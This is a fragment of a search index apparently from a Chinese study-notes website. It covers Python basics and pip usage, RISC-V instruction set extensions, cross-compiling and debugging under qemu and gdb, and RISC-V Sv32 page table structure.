<li>hashlib\uff1a\u54c8\u5e0c\u8ba1\u7b97</li> <li>random\uff1a\u968f\u673a\u6570</li> <li>csv\u3001json\uff1a\u6570\u636e\u683c\u5f0f\u89e3\u6790</li> <li>collections\uff1a\u66f4\u591a\u7c7b\u578b</li> <li>...</li> </ul> <p>\u770b\u6587\u6863\uff1adocs.python.org/zh-cn/3/library </p>"},{"location":"cs/pl/python/basic/#_41","title":"\u5916\u90e8\u6a21\u5757\u5b89\u88c5","text":"<ul> <li>pypi.org \u4e0a\u6709\u6781\u591a\u522b\u4eba\u5199\u597d\u4e86\u53ef\u4ee5\u7528\u7684\u6a21\u5757<ul> <li>numpy \u77e9\u9635\u7b49\u79d1\u5b66\u8ba1\u7b97\u3001scipy \u79d1\u5b66\u8ba1\u7b97\u3001matplotlib \u4f5c\u56fe\u2026\u2026</li> </ul> </li> <li>\u4f7f\u7528 pip \u5b89\u88c5\uff08pip / python -m pip\uff09<ul> <li>pip install pkg_name</li> <li>pip install pkg_name=... \u6307\u5b9a\u7248\u672c</li> <li>pip install -r requirements.txt \u5b89\u88c5 txt \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5305</li> <li>pip install ... -i https://pypi.tuna.tsinghua.edu.cn/simple \u6362\u6e90</li> <li>pip list\u3001pip show \u547d\u4ee4\u67e5\u770b\u5b89\u88c5\u7684\u6240\u6709\u5305/\u67d0\u4e2a\u5305\u7684\u4fe1\u606f</li> <li>pip uninstall pkg_name \u5378\u8f7d\u5305</li> </ul> </li> <li>pip \u5b89\u88c5\u672c\u5730\u6a21\u5757<ul> <li>\u76ee\u5f55\u4e0b\u9700\u8981\u5305\u542b setup.py / pyproject.toml</li> <li>pip install . \u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u590d\u5236\u5230 site-packages \u4e2d\uff09</li> <li>pip install -e . \u53ef\u4fee\u6539\u5f62\u5f0f\u5b89\u88c5\u672c\u5730\u6a21\u5757\uff08\u5728\u5f53\u524d\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4ee3\u7801\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_42","title":"\u6587\u6863\u5b57\u7b26\u4e32","text":"<ul> <li>\u6a21\u5757\u5f00\u5934\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32</li> <li>\u7c7b\u3001\u51fd\u6570\u5b9a\u4e49\u4e0b\u9762\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32</li> <li>help(...) \u7684\u65f6\u5019\u53ef\u4ee5\u663e\u793a</li> <li>obj.__doc__ \u8868\u793a\u8fd9\u4e32\u5b57\u7b26\u4e32</li> <li>\u7f16\u8f91\u5668\u7528\u6765\u63d0\u793a</li> <li>\u4e00\u4e9b\u6587\u6863\u751f\u6210\u5de5\u5177\uff08sphinx \u7b49\uff09\u4ece\u4e2d\u83b7\u53d6\u6587\u6863</li> </ul> <pre><code>\"\"\"\ndocstring for module\n\"\"\"\n\ndef func(...):\n    \"\"\"docstring for function\"\"\"\n    ...\n\nclass A():\n    \"\"\"docstring for class\"\"\"\n    def __init__(self, ...):\n        \"\"\"docstring for method\"\"\"\n        ...\n</code></pre>"},{"location":"cs/pl/python/basic/#_43","title":"\u4ee3\u7801\u89c4\u8303","text":"<ul> <li>PEP\uff1aPython Enhancement Proposals\uff1apeps.python.org </li> <li>PEP 8 \u89c4\u8303\uff0c\u7ed9\u51fa\u4e86\u63a8\u8350\u4f7f\u7528\u7684 python \u4ee3\u7801\u98ce\u683c\u89c4\u8303<ul> <li>peps.python.org/pep-0008</li> <li>pep8.org</li> </ul> </li> <li>\u66f4\u7ec6\u81f4\u7684\u4ee3\u7801\u98ce\u683c<ul> <li>black github.com/psf/black </li> <li>flake8 flake8.pycqa.org </li> <li>...</li> </ul> </li> </ul>"},{"location":"cs/pl/python/basic/#_44","title":"\u66f4\u591a\uff1f","text":"<ul> <li>\u57fa\u7840<ul> <li>\u300aPython \u7f16\u7a0b\uff1a\u4ece\u5165\u95e8\u5230\u5b9e\u8df5\u300bISBN 978-7-115-54608-1 </li> <li>Python 3 \u83dc\u9e1f\u6559\u7a0b runoob.com/python3/python3-tutorial.html </li> <li>Python \u5b98\u65b9\u6587\u6863 tutorial docs.python.org/3/tutorial </li> <li>\u4e2d\u56fd\u5927\u5b66 mooc - \u6d59\u6c5f\u5927\u5b66 Python \u7a0b\u5e8f\u8bbe\u8ba1 </li> </ul> </li> <li>\u8fdb\u9636<ul> <li>\u300a\u6d41\u7545\u7684 Python\u300bISBN 978-7-115-45415-7 </li> <li>Python \u5b98\u65b9\u6587\u6863 docs.python.org/3 </li> <li>\u5b66\u4e00\u4e9b\u5b9e\u7528\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u770b\u6587\u6863</li> <li>PEP peps.python.org\uff08\u6ce8\u610f\u5206\u6e05\u6709\u6ca1\u6709\u5b9e\u65bd\uff09</li> <li>GitHub \u627e\u9879\u76ee\u8bfb</li> </ul> </li> </ul>"},{"location":"cs/pl/python/numpy/","title":"NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93","text":"<p> \u7ea6 38 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Abstract</p> <p>numpy \u7684\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6574\u7406\u81ea\uff1a</p> <ul> <li>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT</li> <li>NumPy documentation</li> <li>NumPy Illustrated: The Visual Guide to NumPy</li> </ul> <p>TODO _(:\u0437\u300d\u2220)_</p>"},{"location":"cs/pl/riscv/","title":"RISC-V ISA","text":"<p> \u7ea6 1140 \u4e2a\u5b57  17 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u8bfe\u4e0a\u5b66\u5230\u7684\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 RISC-V\uff0c\u5b98\u7f51 https://riscv.org/</p> <p>\u5b50\u9875\u9762</p> <ul> <li>RISC-V \u975e\u7279\u6743\u7ea7 ISA</li> <li>RISC-V \u7279\u6743\u7ea7 ISA\uff08\u57fa\u7840&amp;\u4e2d\u65ad\uff09</li> <li>RISC-V \u7279\u6743\u7ea7 ISA\uff08\u9875\u8868\u76f8\u5173\uff09</li> </ul>"},{"location":"cs/pl/riscv/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":"<ul> <li>RISC-V \u662f\u4e00\u4e2a ISA \u6807\u51c6</li> <li>RISC-V \u662f\u5b8c\u5168\u5f00\u653e\u7684\uff0c\u5141\u8bb8\u4efb\u4f55\u4eba\u4f7f\u7528</li> <li>\u7b80\u5355\u3001\u53ef\u6269\u5c55</li> <li>\u5206\u4e3a\u7528\u6237\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08User-level ISA spec\uff09\u548c\u7279\u6743\u7ea7\u6307\u4ee4\u96c6\u89c4\u8303\uff08Privilege ISA spec\uff09\u7b49</li> <li>\u547d\u540d\u4e3a RV + \u6570\u636e\u5bbd\u5ea6 + \u6269\u5c55</li> </ul>"},{"location":"cs/pl/riscv/#_2","title":"\u6307\u4ee4\u96c6","text":"<ul> <li>\u57fa\u7840\u6307\u4ee4\u96c6\uff1aRV32I\u3001RV64I\uff0832/64 \u4f4d\u5e26\u6709\u6574\u578b\u64cd\u4f5c\u7684\u6307\u4ee4\u96c6\uff09\u3001RV32E\uff08\u53ea\u6709 16 \u4e2a\u5bc4\u5b58\u5668\u7684 32 \u4f4d\u6574\u578b\u6307\u4ee4\u96c6\uff09<ul> <li>I\uff1a\u5e26\u6709 ALU \u8fd0\u7b97\u3001\u5206\u652f\u8df3\u8f6c\u3001\u88c5\u8f7d\u5b58\u50a8</li> </ul> </li> <li>\u6269\u5c55\uff1a<ul> <li>M\uff1a\u589e\u52a0\u6574\u578b\u4e58\u6cd5\u3001\u9664\u6cd5</li> <li>A\uff1a\u539f\u5b50\u6307\u4ee4</li> <li>F\uff1a\u589e\u52a0\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570</li> <li>D\uff1a\u589e\u52a0\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570</li> <li>Q\uff1a\u589e\u52a0 128 \u4f4d\u56db\u7cbe\u5ea6\u6d6e\u70b9\u6570</li> <li>Zicsr\uff1a\u589e\u52a0 CSR\uff08\u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff09</li> <li>Zifencei\uff1a\u589e\u52a0 FENCE.I \u6307\u4ee4</li> <li>...</li> <li>G\uff1a= IMAFDZicsr_Zifencei</li> </ul> </li> <li>\u6269\u5c55\u4e86\u7684\u6307\u4ee4\u96c6\u5219\u547d\u540d\u4e3a RV32IM\u3001RV32IMA\u3001RV32G \u7b49\u7b49</li> </ul>"},{"location":"cs/pl/riscv/#_3","title":"\u7f16\u8bd1\u8fd0\u884c\u8c03\u8bd5","text":""},{"location":"cs/pl/riscv/#_4","title":"\u7f16\u8bd1","text":"<p>\u7f16\u8bd1\u4f7f\u7528  riscv-collab/riscv-gnu-toolchain\u3002</p> <ul> <li>\u9700\u8981\u624b\u52a8\u514b\u9686\u6e90\u7801\uff08\u6781\u5927\uff09\uff0c\u518d\u7f16\u8bd1\uff0c\u65f6\u95f4\u5f88\u957f</li> <li>\u7f16\u8bd1\u65f6\u6ce8\u610f prefix \u548c\u9009\u62e9\u6307\u4ee4\u96c6 --with-arch</li> <li>make linux \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscvxx-linux-gnu-xxx\uff0c\u4f7f\u7528 glibc \u6807\u51c6\u5e93\uff0c\u652f\u6301\u52a8\u6001\u94fe\u63a5</li> <li>make \u6216 make newlib \u7f16\u8bd1\u51fa\u6765\u7684\u662f riscvxx-unknown-elf-xxx\uff0c\u4f7f\u7528 riscv-newlib\uff0c\u53ea\u80fd\u9759\u6001\u94fe\u63a5</li> </ul> <p>Ubuntu 20.04+ \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 apt \u5b89\u88c5\uff1a <pre><code>$ sudo apt install qemu-system-misc gcc-riscv64-linux-gnu gdb-multiarch\n</code></pre></p> <p>\u7f16\u8bd1 c \u4ee3\u7801\u4f7f\u7528 riscvxx-unknown-xxx-gcc \u5c31\u53ef\u4ee5\u4e86\uff0c\u6ce8\u610f\u6307\u5b9a -march \u548c -mabi\uff0c\u6bd4\u5982\u52a0\u4e0a <code>-march=rv32i -mabi=ilp32</code> \u540e\u7f16\u8bd1\u51fa\u6765\u7684\u5c31\u662f\u4f7f\u7528 RV32I \u6307\u4ee4\u96c6\u7684\u673a\u5668\u7801\u3002</p> <p>\u6bd4\u5982\u7f16\u8bd1\u4e00\u4e2a\u7eaf riscv \u7684\u6c47\u7f16\u4ee3\u7801\u5c31\u53ef\u4ee5\u8fd9\u6837\uff1a</p> <pre><code>$ cat code.s\n.section .text\n.globl _start\n_start:\n    ...\n    ...\n$ riscv64-unknown-elf-gcc -nostdlib -nostdinc -static -g -Ttext 0x80000000 -o code.elf code.s\n$ riscv64-unknown-elf-gcc -nostdlib -nostdinc -static -g -Ttext 0x80000000 -o code.elf code.s -march=rv32i -mabi=ilp32\n$ riscv64-linux-gnu-gcc -nostdlib -nostdinc -static -g -Ttext 0x80000000 -o code.elf code.s\n$ riscv64-linux-gnu-gcc -nostdlib -nostdinc -static -g -Ttext 0x80000000 -o code.elf code.s -march=rv32i -mabi=ilp32\n</code></pre>"},{"location":"cs/pl/riscv/#_5","title":"\u8fd0\u884c","text":"<p>\u56e0\u4e3a RISC-V \u662f\u53e6\u4e00\u79cd\u67b6\u6784\uff0c\u4e0d\u80fd\u5728 x86 \u673a\u5668\u4e0a\u76f4\u63a5\u8fd0\u884c\uff0c\u6240\u4ee5\u8981\u4f7f\u7528 qemu \u6765\u8fd0\u884c\u3002qemu \u76f4\u63a5\u4e0b\u8f7d\u5c31\u53ef\u4ee5\uff0c\u4e00\u822c\u90fd\u4f1a\u81ea\u5e26 RISC-V \u7684\u6a21\u62df\u5668\uff0c\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u7f16\u8bd1\u51fa RISC-V\u3002</p> <p>qemu \u6709\u7528\u6237\u6001\u548c\u7cfb\u7edf\u6001\u4e24\u79cd\u6a21\u62df\u5668\uff0c\u5206\u522b\u662f qemu-riscv64 \u548c qemu-system-riscv64\uff0c\u524d\u8005\u7528\u4e8e\u6a21\u62df\u7528\u6237\u6001\u7684\u5355\u4e2a\u7a0b\u5e8f\uff0c\u540e\u8005\u7528\u4e8e\u6a21\u62df\u6574\u4e2a RISC-V \u7279\u6743\u7ea7\u7cfb\u7edf\u3002\u6bd4\u5982\uff1a</p> <pre><code>$ qemu-riscv64 code.elf\n$ qemu-riscv64 -singlestep -g 1234 code.elf # \u4f9b gdb \u5355\u6b65\u8c03\u8bd5\uff08\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u7cfb\u7edf\u6001 qemu\uff09\n$ qemu-system-riscv64 -nographic -machine virt -bios default -kernel code.elf # \u8fd0\u884c\u5185\u6838\n$ qemu-system-riscv64 -nographic -machine virt -bios default -kernel code.elf -S -s # \u8c03\u8bd5\u5185\u6838\uff0c\u5f00\u542f localhost:1234 \u7aef\u53e3\u4f9b gdb \u8fde\u63a5\n</code></pre>"},{"location":"cs/pl/riscv/#_6","title":"\u8c03\u8bd5","text":"<p>\u5de5\u5177\u94fe\u4f1a\u5305\u542b\u652f\u6301 RISC-V \u7684 gdb\uff0c\u4e5f\u53ef\u4ee5\u81ea\u884c\u7f16\u8bd1\u51fa\u652f\u6301 RISC-V \u7684 gdb\u3002\u6216\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528 gdb-multiarch \u6765\u8fdb\u884c\u8c03\u8bd5\u3002</p> <p>\u5bf9\u4e8e RISC-V \u67b6\u6784\u6765\u8bf4\uff0cpwn \u5e38\u7528\u7684 gdb \u63d2\u4ef6\u6bd4\u5982 pwndbg \u548c peda \u90fd\u4e0d\u652f\u6301\uff0c\u8fd9\u91cc\u63a8\u8350\u4e00\u4e2a gdb-dashboard \u63d2\u4ef6\uff0c\u5373\u4f7f\u662f RISC-V \u4e5f\u53ef\u4ee5\u6b63\u5e38\u663e\u793a\u5bc4\u5b58\u5668\u3001\u53cd\u6c47\u7f16\u7b49\u4fe1\u606f\uff0c\u5b89\u88c5\uff1a</p> <pre><code>$ pip install pygments\n$ wget -P ~ https://git.io/.gdbinit\n</code></pre>"},{"location":"cs/pl/riscv/#_7","title":"\u7b80\u5316\u7684\u9010\u6307\u4ee4\u7ffb\u8bd1","text":"<p>\u6309\u7167\u524d\u9762\u7684\u65b9\u6cd5\u5bf9 asm \u8fdb\u884c\u7f16\u8bd1\u5f97\u5230\u6307\u4ee4\u673a\u5668\u7801\u6709\u65f6\u5019\u8fd8\u662f\u592a\u9ebb\u70e6\uff0c\u800c\u4e14\u53ea\u6709\u673a\u5668\u7801\u7684\u60c5\u51b5\u4e0b\u60f3\u8981 objdump \u4e5f\u6709\u4e9b\u9ebb\u70e6\u3002\u6240\u4ee5\u6211\u5e72\u8106\u7ed9 CyberChef \u52a0\u4e86 RISC-V \u7684\u7f16\u89e3\u7801\u5668\uff0c\u8c03\u7528\u4e86 rvcodec.js\uff0c\u4f4d\u7f6e\u5728 lab.tonycrane.cc/CyberChef\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u3002</p> <p>\u5173\u4e8e CyberChef \u7684\u7528\u6cd5\u4e0d\u5728\u8fd9\u91cc\u8d58\u8ff0\uff0c\u5927\u6982\u5c31\u662f\u4ece\u5de6\u4fa7\u62d6\u62fd\u6a21\u5757\u5230\u4e2d\u95f4\u83dc\u8c31\uff08recipe\uff09\u90e8\u5206\u5373\u53ef\uff0c\u591a\u4e2a\u6a21\u5757\u7684\u8bdd\u4ece\u4e0a\u5230\u4e0b\u4f9d\u6b21\u6267\u884c\u3002</p> <p>\u8981\u6ce8\u610f\u7684\u662f\u6211\u5b9e\u73b0\u7684 Decoder \u63a5\u6536\u7684\u7c7b\u578b\u4e3a raw \u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6240\u4ee5\u5982\u679c\u662f hex \u503c\u683c\u5f0f\u7684\u5b57\u8282\u7801\u7684\u8bdd\u8981\u5728\u524d\u9762\u52a0\u4e00\u4e2a From Hex \u6a21\u5757\u3002</p>"},{"location":"cs/pl/riscv/#_8","title":"\u5176\u4ed6\u6742\u9879\u95ee\u9898","text":""},{"location":"cs/pl/riscv/#_9","title":"\u94fe\u63a5\u671f\u91cd\u5b9a\u4f4d\u95ee\u9898","text":"<p>\u5728\u505a\u7cfb\u7edf\u4e09\u865a\u62df\u5185\u5b58 lab \u7684\u65f6\u5019\u53d1\u73b0\u7684\u95ee\u9898\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u4e0d\u540c\u7248\u672c\u7684 RISC-V \u5de5\u5177\u94fe\u5bf9\u4e8e relocation \u7684\u5904\u7406\u53ef\u80fd\u4e0d\u4e00\u81f4\uff0c\u5bfc\u81f4\u4e0d\u540c\u73af\u5883\u4e0b\u9700\u8981\u4e0d\u540c\u4ee3\u7801\u624d\u80fd\u8fd0\u884c\u3002</p> <p>\u95ee\u9898\u7684\u80cc\u666f\u662f\u5185\u6838\u542f\u52a8\u65f6\u5148\u5728\u7269\u7406\u5730\u5740\u5185\u8fd0\u884c\uff0c\u7136\u540e\u8bbe\u7f6e\u597d\u9875\u8868\u540e\u5199\u5165 satp \u5bc4\u5b58\u5668\u4e2d\uff0c\u8fd9\u65f6\u4e5f\u5c31\u542f\u7528\u4e86\u865a\u62df\u5185\u5b58\u3002\u6240\u4ee5\u60c5\u51b5\u5c31\u662f\u4e00\u4efd\u7f16\u8bd1\u597d\u7684\u4ee3\u7801\u7684\u5bfb\u5740\u76f8\u5173\uff08\u6bd4\u5982\u5185\u6838\u542f\u52a8\u65f6\u8bbe\u7f6e sp\uff0c\u8bfb\u53d6\u672c\u5730\u53d8\u91cf\u5730\u5740\u7b49\uff09\u5728\u8fd0\u884c\u65f6\u53ef\u80fd\u9700\u8981\u662f\u7269\u7406\u5730\u5740\uff0c\u4e5f\u53ef\u80fd\u9700\u8981\u662f\u865a\u62df\u5730\u5740\u3002</p> <ul> <li>\u5bf9\u4e8e\u8f83\u8001\u7684\u5de5\u5177\u94fe\uff0c\u5bfb\u5740\u57fa\u672c\u90fd\u662f\u4ee5 pc \u4e3a\u57fa\u51c6\u8fdb\u884c\u504f\u79fb\uff0c\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u56e0\u4e3a\u5bf9\u5e94\u7684 pc \u5c31\u662f\u6b63\u786e\u7684\u5730\u5740</li> <li>\u8f83\u65b0\u7684\u5de5\u5177\u94fe\u7f16\u8bd1\u51fa\u6765\u7684\u4f1a\u4f7f\u7528 GOT \u8868\u6765\u8fdb\u884c\u5bfb\u5740\uff0c\u800c\u6839\u636e\u94fe\u63a5\u811a\u672c\uff0cGOT \u8868\u5185\u7684\u9879\u80af\u5b9a\u90fd\u662f\u865a\u62df\u5730\u5740\uff0c\u8fd9\u6837\u5728\u542f\u7528\u865a\u62df\u5730\u5740\u4e4b\u524d\u76f4\u63a5\u5bfb\u5740\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898</li> </ul> <p>\u56e0\u4e3a\u5176\u5b9e\u8bbe\u7f6e satp \u524d\u7684\u8fc7\u7a0b\u5927\u90e8\u5206\u90fd\u662f head.S \u4e2d\u6c47\u7f16\u624b\u5199\u7684\uff0c\u6240\u4ee5\u9488\u5bf9\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u53d1\u73b0\u6709\u5bfb\u5740\u5230\u865a\u62df\u5730\u5740\u7684\u8bdd\u76f4\u63a5\u624b\u52a8\u51cf\u4e00\u4e0b offset \u5c31\u53ef\u4ee5\u4e86\u3002</p>"},{"location":"cs/pl/riscv/paging/","title":"RISC-V \u7279\u6743\u7ea7 ISA\uff08\u9875\u8868\u76f8\u5173\uff09","text":"<p> \u7ea6 2890 \u4e2a\u5b57  6 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 10 \u5206\u949f</p> <p>Abstract</p> <p>RISC-V \u6307\u4ee4\u96c6\u7684\u7279\u6743\u7ea7\u90e8\u5206\u3002\u8fd9\u91cc\u53ea\u5305\u542b\u9875\u8868\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u5176\u4ed6\u7684\u5185\u5bb9\u5728 RISC-V \u7279\u6743\u7ea7 ISA\uff08\u57fa\u7840&amp;\u4e2d\u65ad\uff09\u91cc\u3002</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>The RISC-V Instruction Set Manual Volume II: Privileged Architecture v.20211203</li> <li>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162 \u201c\uff08\u5927\u4e8c\u6625\u590f\uff09\u8bfe\u7a0b</li> </ul> <p>\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u865a\u62df\u5730\u5740\u9700\u8981\u786c\u4ef6\u7684\u652f\u6301\uff0c\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u5411 CPU \u901a\u77e5\u8bbe\u7f6e\u9875\u8868\uff0c\u5728\u8bbf\u95ee\u65f6 CPU \u518d\u8fdb\u884c\u5730\u5740\u7684\u7ffb\u8bd1\u3002\u800c\u8fd9\u4e9b\u9875\u8868\u7684\u8bbe\u7f6e\u64cd\u4f5c\u90fd\u662f\u5728 Supervisor \u6a21\u5f0f\u4e0b\u8fdb\u884c\u8bbe\u7f6e\u7684\uff0c\u56e0\u4e3a User \u6a21\u5f0f\u4e0d\u5e94\u8be5\u5173\u5fc3\u8fd9\u4e9b\uff0cMachine \u6a21\u5f0f\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u5730\u5740\u4e5f\u4e0d\u5173\u5fc3\u3002\u6240\u4ee5\u5173\u4e8e\u5206\u9875\u7684 ISA \u90fd\u5728 Supervisor \u91cc\u3002</p>"},{"location":"cs/pl/riscv/paging/#csr","title":"\u76f8\u5173 CSR \u5bc4\u5b58\u5668","text":""},{"location":"cs/pl/riscv/paging/#sstatus","title":"sstatus","text":"<ul> <li>18 SUM\uff1a\u662f\u5426\u5141\u8bb8 Supervisor \u6a21\u5f0f\u8bbf\u95ee\u7528\u6237\u6001\u5185\u5b58\uff08permit Supervisor User Memory access\uff09</li> <li>19 MXR\uff1a\u662f\u5426\u5141\u8bb8\u8bfb\u53d6\u53ef\u6267\u884c\u9875\u9762\u7684\u5185\u5b58\uff08Make eXecutable Readable\uff09</li> </ul>"},{"location":"cs/pl/riscv/paging/#satp","title":"satp","text":"<p>satp \u4e3a Supervisor Address Translation and Protection\uff0c\u5373\u7528\u4e8e\u8bbe\u7f6e\u9875\u8868\u7684\u5bc4\u5b58\u5668\u3002</p> satp 32 \u4f4d Supervisor 31 30 22 21 0 M ASID PPN <ul> <li>PPN\uff1a\u6839\u9875\u8868\u7269\u7406\u9875\u53f7\uff08Physical Page Number\uff09</li> <li>ASID\uff1a\u5730\u5740\u7a7a\u95f4 ID\uff08Address Space ID\uff09</li> <li>M\uff08MODE\uff09\uff1a\u5206\u9875\u6a21\u5f0f<ul> <li>0\uff1aBare \u4e0d\u8fdb\u884c\u5730\u5740\u7ffb\u8bd1\u6216\u8005\u4fdd\u62a4</li> <li>1\uff1aSv32 \u91c7\u7528 Sv32 \u6a21\u5f0f\u865a\u62df\u5730\u5740\u7ffb\u8bd1</li> </ul> </li> </ul> satp 64 \u4f4d Supervisor 63 60 59 44 43 0 M ASID PPN <ul> <li>PPN\uff1a\u6839\u9875\u8868\u7269\u7406\u9875\u53f7\uff08Physical Page Number\uff09</li> <li>ASID\uff1a\u5730\u5740\u7a7a\u95f4 ID\uff08Address Space ID\uff09</li> <li>M\uff08MODE\uff09\uff1a\u5206\u9875\u6a21\u5f0f<ul> <li>0\uff1aBare \u4e0d\u8fdb\u884c\u5730\u5740\u7ffb\u8bd1\u6216\u8005\u4fdd\u62a4</li> </ul> </li> </ul> <ul> <li>8\uff1aSv39\u2003</li> <li>9\uff1aSv48 </li> </ul> <ul> <li>10\uff1aSv57 </li> <li>11\uff1aSv64\uff08\u4fdd\u7559\uff09</li> </ul>"},{"location":"cs/pl/riscv/paging/#_1","title":"\u76f8\u5173\u7279\u6743\u6307\u4ee4","text":"sfence.vma R \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0001001 rs2 rs1 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asfence.vma rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5237\u65b0 TLB\uff08Translation Lookaside Buffer\uff09\u4e2d\u7684\u865a\u62df\u5730\u5740\u5230\u7269\u7406\u5730\u5740\u7684\u6620\u5c04\u7f13\u5b58<ul> <li>rs1 rs2 \u5747\u4e3a x0 \u65f6\uff0c\u5237\u65b0\u6240\u6709 TLB</li> <li>rs1 \u6307\u5b9a\u8981\u5237\u65b0\u7684\u865a\u62df\u5730\u5740\uff0c\u4e0d\u4e3a x0 \u5219\u53ea\u5237\u65b0\u6240\u5728\u7684\u53f6\u9875\u8868\u9879</li> <li>rs2 \u6307\u5b9a ASID\uff0c\u4e0d\u4e3a x0 \u5219\u53ea\u5237\u65b0\u6307\u5b9a ASID \u7684 TLB</li> </ul> </li> </ul>"},{"location":"cs/pl/riscv/paging/#sv32","title":"Sv32 \u5206\u9875\u6a21\u5f0f","text":"<p>Sv32 \u6a21\u5f0f\u89c4\u5b9a\u7684\u865a\u62df\u5730\u5740\u6709 32 \u4f4d\uff0c\u7269\u7406\u5730\u5740\u6709 34 \u4f4d\uff0c\u7ed3\u6784\u5206\u522b\u4e3a\uff1a</p> 31 22 21 12 11 0 VPN[1] VPN[0] page offset 33 22 21 12 11 0 PPN[1] PPN[0] page offset <p>\u5176\u4e2d VPN \u5373 Virtual Page Number \u865a\u62df\u9875\u53f7\uff0cPPN \u5373 Physical Page Number \u7269\u7406\u9875\u53f7\u3002\u8f6c\u6362\u7684\u76ee\u6807\u5c31\u662f\u628a 20 \u4f4d\u865a\u62df\u9875\u53f7\u8f6c\u4e3a 22 \u4f4d\u7269\u7406\u9875\u53f7\uff0coffset \u4e0d\u53d8\u3002</p> <p>Sv32 \u4f7f\u7528\u4e8c\u7ea7\u9875\u8868\uff0c\u6bcf\u4e00\u4e2a\u9875\u8868\u5305\u542b 2^10=1024 \u4e2a\u9875\u8868\u9879\uff0c\u6bcf\u4e2a\u9875\u8868\u9879\u5360 4 \u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e00\u4e2a\u9875\u8868\u6b63\u597d 4KiB \u5360\u4e00\u9875\u5185\u5b58\u4e14\u5fc5\u987b\u9875\u5bf9\u9f50\u3002\u6bcf\u4e00\u4e2a\u9875\u8868\u9879\u7684\u5185\u5bb9\u5982\u4e0b\uff1a</p> 31 20 19 10 9 8 7 6 5 4 3 2 1 0 PPN[1] PPN[0] RSW D A G U X W R V <p>\u5176\u4e2d PPN[1] PPN[0] \u4e3a\u4e0b\u4e00\u7ea7\u9875\u8868\u7684\u7269\u7406\u9875\u53f7/\u7269\u7406\u5730\u5740\u7684\u9ad8 20 \u4f4d\u3002\u5269\u4e0b\u7684\u4e3a flag\uff1a</p> <ul> <li>RSW\uff1a\u4fdd\u7559\u4f4d\uff0c\u5fc5\u987b\u4e3a 0</li> <li>A\uff08Accessed\uff09\u3001D\uff08Dirty\uff09\uff1a\u53f6\u9875\u8868\u9879\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7\u3001\u662f\u5426\u88ab\u5199\u8fc7\uff08\u6ca1\u7ec6\u770b\uff0c\u53cd\u6b63\u90fd\u662f 0 \u5c31\u884c\uff09</li> <li>G\uff08Global\uff09\uff1a\u5168\u5c40\u4f4d\uff0c\u5982\u679c\u4e3a 1 \u5219\u4e0d\u4f1a\u88ab TLB \u6e05\u9664\uff08\u4e5f\u6ca1\u7ec6\u770b\uff09</li> <li>U\uff08User\uff09\uff1a\u7528\u6237\u4f4d\uff0c\u5982\u679c\u4e3a 1 \u5219\u5141\u8bb8\u7528\u6237\u6001\u8bbf\u95ee</li> <li>X\uff08eXecute\uff09\u3001W\uff08Write\uff09\u3001R\uff08Read\uff09\uff1a\u53ef\u6267\u884c\u3001\u53ef\u5199\u3001\u53ef\u8bfb\u4f4d<ul> <li>RWX \u5168\u4e3a 0 \u65f6\u8868\u793a\u5f53\u524d\u9875\u8868\u9879\u6307\u5411\u4e0b\u4e00\u7ea7\u9875\u8868</li> <li>W \u4e3a 1\uff0cR \u4e00\u5b9a\u4e5f\u4e3a 1\uff08W \u4e3a 1\u3001R \u4e3a 0 \u662f\u4fdd\u7559\u72b6\u6001\uff09</li> </ul> </li> <li>V\uff08Valid\uff09\uff1a\u6709\u6548\u4f4d\uff0c\u5982\u679c\u4e3a 1 \u5219\u8868\u793a\u8be5\u9875\u8868\u9879\u6709\u6548\uff0c\u5426\u5219\u5728\u8bbf\u95ee\u65f6\u4f1a\u89e6\u53d1\u5f02\u5e38</li> </ul> <p>\u5730\u5740\u7ffb\u8bd1\u7684\u6d41\u7a0b\u56fe\u4e3a\uff1a</p> <p> </p> 